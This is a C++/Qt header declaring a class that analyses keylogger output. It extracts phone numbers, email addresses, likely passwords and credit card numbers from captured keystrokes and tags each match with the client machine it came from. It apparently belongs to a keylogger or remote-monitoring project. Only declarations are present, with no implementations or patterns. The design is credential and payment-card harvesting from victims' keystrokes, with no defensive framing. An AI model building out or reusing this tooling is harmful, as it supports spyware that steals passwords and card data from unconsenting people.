#pragma once

#include <QString>
#include <QStringList>
#include <QRegularExpression>
#include <QMap>
#include <QVector>

/**
 * @brief Structure to hold analysis results for a specific data type
 */
struct AnalysisResult
{
    QString type;                  // Type of data (phone, email, password, card)
    QStringList matches;          // List of found matches
    QStringList contexts;         // Context where each match was found
    QStringList clientSources;    // Client information for each match
    int totalCount;               // Total number of matches
    
    AnalysisResult() : totalCount(0) {}
};

/**
 * @brief Class for analyzing keylogger data to extract sensitive information
 */
class LPTF_Analysis
{
public:
    LPTF_Analysis();
    ~LPTF_Analysis();
    
    // Main analysis function
    QMap<QString, AnalysisResult> analyzeKeylogs(const QStringList& keylogs);
    QMap<QString, AnalysisResult> analyzeKeylogsWithClients(const QMap<QString, QString>& keylogsWithClients);
    
    // Individual analysis methods
    AnalysisResult analyzePhoneNumbers(const QString& text);
    AnalysisResult analyzeEmailAddresses(const QString& text);
    AnalysisResult analyzePotentialPasswords(const QString& text);
    AnalysisResult analyzeCreditCardNumbers(const QString& text);
    
private:
    // Regex patterns for different data types
    QRegularExpression phonePattern_;
    QRegularExpression emailPattern_;
    QRegularExpression passwordPattern_;
    QRegularExpression creditCardPattern_;
    
    // Helper methods
    void initializePatterns();
    QString extractContext(const QString& text, int position, int contextLength = 50);
    bool isValidCreditCard(const QString& cardNumber);
    QString cleanPhoneNumber(const QString& phone);
};